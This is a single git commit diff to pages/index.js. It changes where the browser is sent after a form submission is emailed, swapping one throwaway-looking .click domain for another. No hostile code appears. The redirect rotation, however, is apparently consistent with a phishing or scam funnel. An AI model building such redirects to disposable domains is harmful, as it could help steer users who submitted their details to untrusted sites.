3969193bd315a9fe89377216dd8f3884f39bd909
husknet <127146284+husknet@users.noreply.github.com>
2024-09-05 15:12:13 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://tb.reborthtobi.click/';
+        window.location.href = 'https://sh.chisoll-ish.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
